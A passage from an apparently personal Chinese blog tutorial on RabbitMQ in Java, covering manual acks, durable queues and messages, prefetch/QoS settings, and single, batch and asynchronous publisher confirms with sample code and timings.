class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        System.out.println(<span class="hljs-string">&quot;C1等待接受消息处理时间较短&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            <span class="hljs-comment">// 沉睡一秒</span><br>            SleepUtils.sleep(<span class="hljs-number">1</span>);<br>            System.out.println(<span class="hljs-string">&quot;接受到的消息是:&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br><br>            <span class="hljs-comment">//进行手动应答</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            * 参数1：消息的标记  tag</span><br><span class="hljs-comment">            * 参数2：是否批量应答，false：不批量应答 true：批量</span><br><span class="hljs-comment">            * */</span><br>            channel.basicAck(message.getEnvelope().getDeliveryTag(),<span class="hljs-literal">false</span>);<br>        &#125;;<br><br><br>        <span class="hljs-comment">// 采用手动应答</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">autoAck</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        channel.basicConsume(TASK_QUEUE_NAME,autoAck,deliverCallback,(consumerTag) -&gt; &#123;<br>            System.out.println(consumerTag+<span class="hljs-string">&quot;消费者取消消费接口回调逻辑&quot;</span>);<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>测试</p><p>Consumer02由于处理时间太长，我们挂掉他，这个时候信息会重回队列分给Consumer01进行处理。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154633047.png" alt="image-20230112154633047" /></p><p>​<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154849067.png" alt="image-20230112154849067" /></p><p>Consumer02挂之前</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154649174.png" alt="Consumer02挂之前" /></p><p>​Consumer02挂之后</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154706690.png" alt="Consumer02挂之后" /></p><h2 id="43-持久化"><a class="markdownIt-Anchor" href="#43-持久化"></a> 4.3 持久化</h2><blockquote><p>概念</p></blockquote><p>刚刚我们已经看到了如何处理任务不丢失的情况，但是如何保障当RabbitMQ服务停掉以后消息生产者发送过来的消息不丢失。默认情况下RabbitMQ退出或由于某种原因崩溃时，它忽视队列和消息，除非告知它不要这样做。确保消息不会丢失需要做两件事:我们需要将队列和消息都标记为持久化。</p><blockquote><p>队列持久化</p></blockquote><ol><li><p>之前我们创建的队列都是非持久化的，rabbitmq如果重启的化，该队列就会被删除掉，如果要队列实现持久化需要在声明队列的时候把durable参数设置为持久化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 声明队列</span><br><span class="hljs-comment">// 持久化 需要让Queue持久化</span><br><span class="hljs-type">boolean</span> <span class="hljs-variable">durable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>channel.queueDeclare(TASK_QUEUE_NAME,durable,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112155909995.png" alt="image-20230112155909995" /></p></li><li><p>需要注意的就是如果之前声明的队列不是持久化的，需要把原先队列先删除或者重新创建一个持久化的队列，不然就会出现错误</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Caused <span class="hljs-keyword">by</span>: com.rabbitmq.client.ShutdownSignalException: channel error<span class="hljs-punctuation">;</span> protocol <span class="hljs-keyword">method</span>: #<span class="hljs-keyword">method</span>&lt;<span class="hljs-title function_">channel</span>.<span class="hljs-title function_">close</span>&gt;<span class="hljs-params">(reply-code=406, reply-text=PRECONDITION_FAILED - inequivalent arg <span class="hljs-string">&#x27;durable&#x27;</span> <span class="hljs-keyword">for</span> queue <span class="hljs-string">&#x27;ack_queue&#x27;</span> <span class="hljs-keyword">in</span> vhost <span class="hljs-string">&#x27;/&#x27;</span>: received <span class="hljs-string">&#x27;true&#x27;</span> but current <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;false&#x27;</span>, <span class="hljs-keyword">class</span>-id=50, <span class="hljs-keyword">method</span>-id=10)</span><br></code></pre></td></tr></table></figure></li><li><p>重新运行代码后，队列持久化成功</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112160036542.png" alt="image-20230112160036542" /></p></li></ol><blockquote><p>消息持久化</p></blockquote><ol><li><p>要想让消息实现持久化需要在消息生产者修改代码,MessageProperties,PERSISTENT_TEXT_PLAIN添加这个属性。</p></li><li><p>将消息标记为持久化并不能完全保证不会丢失消息。尽管它告诉RabbitMQ将消息保存到磁盘，但是这里依然存在当消息刚准备存储在磁盘的时候但是还没有存储完，消息还在缓存的一个间隔点。此时并没有真正写入磁盘。持久性保证并不强，但是对于我们的简单任务队列而言，这已经绰绰有余了。如果需要更强有力的持久化策略，参考后边课件发布确认章节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置生产者发送消息为持久化消息（要求保存到磁盘上）</span><br>channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,TASK_QUEUE_NAME, MessageProperties.PERSISTENT_TEXT_PLAIN<br>                     ,message.getBytes(StandardCharsets.UTF_8));<br>System.out.println(<span class="hljs-string">&quot;生产者发出消息：&quot;</span>+message);<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112160220437.png" alt="image-20230112160220437" /></p></li></ol><blockquote><p>不公平分发</p></blockquote><ol><li><p>在最开始的时候我们学习到RabbitMQ.分发消息采用的轮训分发，但是在某种场景下这种策略并不是很好，比方说有两个消费者在处理任务，其中有个消费者1处理任务的速度非常快，而另外一个消费者2处理速度却很慢，这个时候我们还是采用轮训分发的化就会到这处理速度快的这个消费者很大一部分时间处于空闲状态，而处理慢的那个消费者一直在干活，这种分配方式在这种情况下其实就不太好，但是RabbitMQ并不知道这种情况，它依然很公平的进行分发。</p></li><li><p>为了避免这种情况，我们可以设置参数<code>channel.basicQos(1)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 设置不公平分发</span><br><span class="hljs-type">int</span> <span class="hljs-variable">prefetchCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>channel.basicQos(prefetchCount);<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161121336.png" alt="image-20230112161121336" /></p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161212158.png" alt="image-20230112161212158" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161234631.png" alt="image-20230112161234631" /></p><p>意思就是如果这个任务我还没有处理完或者我还没有应答你，你先别分配给我，我目前只能处理一个任务，然后 rabbitmq 就会把该任务分配给没有那么忙的那个空闲消费者，当然如果所有的消费者都没有完成手上任务，队列还在不停的添加新任务，队列有可能就会遇到队列被撑满的情况，这个时候就只能添加新的 worker 或者改变其他存储任务的策略。</p><h2 id="44-预取值"><a class="markdownIt-Anchor" href="#44-预取值"></a> 4.4 预取值</h2><p>本身消息的发送就是异步发送的，所以在任何时候，channel上肯定不止只有一个消息另外来自消费者的手动确认本质上也是异步的。因此这里就存在一个未确认的消息缓冲区，因此希望开发人员能限制此缓冲区的大小，以避免缓冲区里面无限制的未确认消息问题。这个时候就可以通过使用basic.gos.方法设置“预取计数”值来完成的。该值定义通道上允许的未确认消息的最大数量。一旦数量达到配置的数量，RabbitMQ将停止在通道上传递更多消息，除非至少有一个未处理的消息被确认，例如，假设在通道上有未确认的消息5、6、7，8，并且通道的预取计数设置为4，此时RabbitMQ.将不会在该通道上再传递任何消息，除非至少有一个未应答的消息被ack。比方说tag=6这个消息刚刚被确认ACK，RabbitMQ将会感知这个情况到并再发送一条消息。消息应答和QoS预取值对用户吞吐量有重大影响。通常，增加预取将提高向消费者传递消息的速度。<strong>虽然自动应答传输消息速率是最佳的，但是，在这种情况下已传递但尚未处理的消息的数量也会增加，从而增加了消费者的RAM消耗</strong>(随机存取存储器)应该小心使用具有无限预处理的自动确认模式或手动确认模式，消费者消费了大量的消息如果没有确认的话，会导致消费者连接节点的内存消耗变大，所以找到合适的预取值是一个反复试验的过程，<strong>不同的负载该值取值也不同100到300范围内的值通常可提供最佳的吞吐量</strong>，并且不会给消费者带来太大的风险。预取值为1是最保守的。当然这将使吞吐量变得很低，特别是消费者连接延迟很严重的情况下，特别是在消费者连接等待时间较长的环境中。对于大多数应用来说，稍微高一点的值将是最佳的。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161337833.png" alt="image-20230112161337833" /></p><h1 id="5-发布确认"><a class="markdownIt-Anchor" href="#5-发布确认"></a> 5. 发布确认</h1><blockquote><p>发布确认原理</p></blockquote><ol><li>生产者将信道设置成confirm模式，一旦信道进入confirm模式，所有在该信道上面发布的消息都将会被指派一个唯一的ID(从1开始)，一旦消息被投递到所有匹配的队列之后，broker就会发送一个确认给生产者(包含消息的唯一ID)，这就使得生产者知道消息已经正确到达目的队列了，如果消息和队列是可持久化的，那么确认消息会在将消息写入磁盘之后发出，broker回传给生产者的确认消息中delivery-tag域包含了确认消息的序列号，此外 broker也可以设置basic.ack 的multiple域，表示到这个序列号之前的所有消息都已经得到了处理。</li><li>confirm模式最大的好处在于他是异步的，一旦发布一条消息，生产者应用程序就可以在等信道返回确认的同时继续发送下一条消息，当消息最终得到确认之后，生产者应用便可以通过回调方法来处理该确认消息，如果RabbitMQ因为自身内部错误导致消息丢失，就会发送一条nack消息，生产者应用程序同样可以在回调方法中处理该nack.消息。</li></ol><blockquote><p>发布确认策略</p></blockquote><p>开启发布确认的方法：</p><p>发布确认默认是没有开启的，如果要开启需要调用方法 confirmSelect，每当你要想使用发布角认，都需要在channel上调用该方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>channel.confirmSelect();<br></code></pre></td></tr></table></figure><blockquote><p>单个发布确认</p></blockquote><ol><li><p>这是一种简单的确认方式，它是一种同步确认发布的方式，也就是发布一个消息之后只有它被确认发布，后续的消息才能继续发布, waitForConfirmsOrDie(long)这个方法只有在消息被确认的时候才返回，如果在指定时间范围内这个消息没有被确认那么它将抛出异常。</p></li><li><p>这种确认方式有一个最大的缺点就是：<code>发布速度特别的慢</code>，因为如果没有确认发布的消息颍会阻塞所有后续消息的发布，这种方式最多提供每秒不超过数百条发布消息的吞吐量。当然对于某些应用程序来说这可能已经足够了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 发布确认模式，</span><br><span class="hljs-comment">* 1、单个确认</span><br><span class="hljs-comment">* 2、批量确认</span><br><span class="hljs-comment">* 3、异步批量确认</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// 批量发消息的个数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1、单个确认</span><br>        <span class="hljs-comment">// 发布1000个单独确认消息，耗时567ms</span><br>        ComfirmMessage.publishMessageIndividually();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishMessageIndividually</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 开启发布确认</span><br>        channel.confirmSelect();<br>        <span class="hljs-comment">// 开始时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// 批量发消息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> i + <span class="hljs-string">&quot;&quot;</span>;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            <span class="hljs-comment">// 单个消息马上进行发布确认</span><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> channel.waitForConfirms();<br>            <span class="hljs-keyword">if</span> (flag)&#123;<br>                System.out.println(<span class="hljs-string">&quot;消息发送成功&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 结束时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;发布&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;个单独确认消息，耗时&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>批量确认发布</p></blockquote><p>上面那种方式非常慢，与单个等待确认消息相比，先发布一批消息然后一起确认可以极大地提高吞吐量，当然这种方式的缺点就是:当发生故障导致发布出现问题时，不知道是哪个消息出现问题了，我们必须将整个批处理保存在内存中，以记录重要的信息而后重新发布消息。当然这种方案仍然是同步的，也一样阻塞消息的发布。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 发布确认模式，</span><br><span class="hljs-comment">* 1、单个确认</span><br><span class="hljs-comment">* 2、批量确认</span><br><span class="hljs-comment">* 3、异步批量确认</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// 批量发消息的个数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//2、批量确认</span><br>        <span class="hljs-comment">// 发布1000个批量确认消息，耗时37ms</span><br>        ComfirmMessage.publishMessageBatch();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishMessageBatch</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 开启发布确认</span><br>        channel.confirmSelect();<br>        <span class="hljs-comment">// 开始时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// 批量确认消息大小</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">batchSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>        <span class="hljs-comment">// 批量发送 批量确认</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> i + <span class="hljs-string">&quot;&quot;</span>;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br><br>            <span class="hljs-comment">// 判断达到100条消息的时候，批量确认一次</span><br>            <span class="hljs-keyword">if</span> (i%batchSize == <span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-comment">// 确认发布</span><br>                channel.waitForConfirms();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 结束时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;发布&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;个批量确认消息，耗时&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>异步发布确认</p></blockquote><p>异步确认虽然编程逻辑比上两个要复杂，但是性价比最高，无论是可靠性还是效率都没得说，他是利用回调函数来达到消息可靠性传递的,这个中间件也是通过函数回调来保证是否投递成功，下面就让我们来详细讲解异步确认是怎么实现的。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112161922791.png" alt="image-20230112161922791" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 发布确认模式，</span><br><span class="hljs-comment">* 1、单个确认</span><br><span class="hljs-comment">* 2、批量确认</span><br><span class="hljs-comment">* 3、异步批量确认</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// 批量发消息的个数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//3、异步批量确认</span><br>        <span class="hljs-comment">// 发布1000个异步确认消息，耗时36ms</span><br>        ComfirmMessage.publicMessageAsync();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publicMessageAsync</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 开启发布确认</span><br>        channel.confirmSelect();<br>        <span class="hljs-comment">// 开始时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br><br>        <span class="hljs-comment">// 消息确认成功回调函数</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">ackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;确认的消息：&quot;</span>+deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// 消息确认失败回调函数</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 参数1：消息的标记</span><br><span class="hljs-comment">        * 参数2：是否为批量确认</span><br><span class="hljs-comment">        * */</span><br>        <span class="hljs-type">ConfirmCallback</span> <span class="hljs-variable">nackCallback</span> <span class="hljs-operator">=</span> (deliveryTag,multiply) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;未确认的消息：&quot;</span>+deliveryTag);<br>        &#125;;<br><br>        <span class="hljs-comment">// 准备消息的监听器，监听哪些消息成功，哪些消息失败</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 参数1：监听哪些消息成功</span><br><span class="hljs-comment">        * 参数2：监听哪些消息失败</span><br><span class="hljs-comment">        * */</span><br>        channel.addConfirmListener(ackCallback,nackCallback);<br><br>        <span class="hljs-comment">// 批量发送消息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;消息&quot;</span> + i;<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,queueName,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br>        <span class="hljs-comment">// 结束时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;发布&quot;</span>+MESSAGE_COUNT+<span class="hljs-string">&quot;个异步确认消息，耗时&quot;</span>+ (end - begin) + <span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如何处理异步未确认信息？</p><p><mark>该实现还有些问题没有整明白，以后有时间在来玩</mark></p><p>最好的解决方案就是把未确认的消息放到一个基于内存的能被发布线程访问的队列，比如说用ConcurrentLinkedQueue这个队列在confirm callbacks与发布线程之间进行消息的传递</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ComfirmMessage</span> &#123;<br><br>    <span class="hljs-comment">// 批量发消息的个数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//3、异步批量确认</span><br>        <span class="hljs-comment">// 发布1000个异步确认消息，耗时36ms</span><br>        ComfirmMessage.publicMessageAsync();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span 